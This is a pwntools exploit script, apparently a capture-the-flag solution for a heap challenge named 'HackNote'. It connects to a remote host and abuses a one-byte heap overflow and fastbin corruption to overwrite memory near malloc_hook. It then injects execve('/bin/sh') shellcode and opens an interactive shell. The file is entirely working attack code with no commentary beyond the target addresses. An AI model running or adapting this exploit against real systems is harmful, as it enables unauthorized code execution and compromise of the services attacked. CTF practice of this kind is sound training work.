from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./HackNote')
else:
	p = remote('183.129.189.62', 10604)

def add(size, content):
	p.recvuntil('4. Exit')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Note:')
	p.send(content)

def free(idx):
	p.recvuntil('4. Exit')
	p.sendline('2')
	p.recvuntil('Note:')
	p.sendline(str(idx))

def edit(idx, content):
	p.recvuntil('4. Exit')
	p.sendline('3')
	p.recvuntil('Index of Note:')
	p.sendline(str(idx))
	p.recvuntil('the Note:')
	p.send(content)

#gdb.attach(p)
add(0x20, 'kotori\n')#0
add(0x18, 'kotori\n')#1
add(0x20, 'kotori\n')#2
add(0x30, 'kotori\n')#3
add(0x20, 'kotori\n')#4
edit(1, 'A' * 0x18)
edit(1, 'A' * 0x18 + '\x71')
free(2)
free(3)
add(0x60, 'A' * 0x20 + p64(0) + p64(0x41) + p64(0x6cb77a) + '\n')
add(0x30, 'kotori\n')
add(0x30, '\x00' * 6 + p64(0) * 4 + p64(0x41) + '\n')
free(2)
free(3)
add(0x60, 'A' * 0x20 + p64(0) + p64(0x41) + p64(0x6cb7a8) + '\n')
add(0x30, 'kotori\n')
add(0x30, p64(0) * 5 + p64(0x41))
free(2)
free(3)
add(0x60, 'A' * 0x20 + p64(0) + p64(0x41) + p64(0x6cb7d8) + '\n')
add(0x30, 'kotori\n')
add(0x30, p64(0) * 5 + p64(0x41))
free(2)
free(3)
add(0x60, 'A' * 0x20 + p64(0) + p64(0x41) + p64(0x6cb808) + '\n')
add(0x30, 'kotori\n')
add(0x30, p64(0) * 5 + p64(0x41))
free(2)
free(3)
add(0x60, 'A' * 0x20 + p64(0) + p64(0x41) + p64(0x6cb838) + '\n')
add(0x30, 'kotori\n')
add(0x30, p64(0) * 2 + p64(0x6cb758) + '\n')
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
add(0x60, 'A' * 0x20 + p64(0x6cb790) + shellcode + '\n')

'''
0x6CBC40 ptr
0x6CB788 malloc_hook
0x6CD5E8 free_hook
'''
p.interactive()
